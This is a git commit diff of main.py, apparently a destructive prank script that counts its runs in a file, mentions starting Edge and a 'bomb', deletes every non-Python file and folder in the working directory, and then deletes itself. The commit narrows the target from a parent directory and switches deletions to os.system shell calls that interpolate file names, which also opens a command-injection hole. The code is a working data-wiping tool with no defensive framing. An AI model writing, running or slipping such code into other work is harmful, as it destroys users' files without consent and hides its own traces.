bd000f94093336b284faf54f548f9325d1d03b69
Oğuz Kayra Büyükyıldırım <74321096+OguzKaira@users.noreply.github.com>
2023-12-12 01:57:43 +0200

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ from sys import argv
 try:
 	# Create new file
 	# Write 1 in new file
-	f = open(".count.txt" , "x")
+	f = open("count.txt" , "x")
 	f.write("1")
 	
 	# Start edge and bomb
@@ -16,7 +16,7 @@ try:
 
 except:
 	# Open File in Reading Writing Mode
-	f = open(".count.txt" , "r+")
+	f = open("count.txt" , "r+")
 	content = 1
 	
 	# Read Data
@@ -24,7 +24,7 @@ except:
 		content = int(i)
 	
 	# Write New Data
-	f = open(".count.txt" , "w+")
+	f = open("count.txt" , "w+")
 	f.write("{}".format(content + 1))
 	
 	# Stop if more than 1 run.
@@ -39,39 +39,30 @@ except:
 
 # Find files and folders
 def find():
-  cwd = str(os.getcwd())
-  path = ''
-  rootCheck = 0
-  for i in cwd:
-      if i != '/':
-          path += i
-      else:
-          rootCheck += 1
-          path += '/'
-          if rootCheck == 3:
-              break
-  files = os.listdir(path)
+  dir = os.getcwd()
+  files = os.listdir(dir)
+
   return files
 
 # Remove files and directories
 def remove():
   for i in find():
-    # If file not equal to our script name continue
-    if pathlib.Path(i) != argv[0]:
+    # If suffix is not .py continue
+    if pathlib.Path(i).suffix != ".py":
       # If there is suffix continue 
       # If there is no suffix it means it's a folder
       if pathlib.Path(i).suffix != "":
-        os.remove(i)
+        os.system('rm "{}"'.format(i))
     
     # if it's not contain delete folder
     if pathlib.Path(i).suffix == "":
-      os.rmdir(i)
-
+      os.system('rmdir "{}"'.format(i))
+	    
 # Close and remove Count file
 # Also destruct yourself
 def deactivate():
   f.close()
-  os.remove("count.txt")
+  os.system("del /f /q count.txt")
   os.remove(argv[0])
 
 
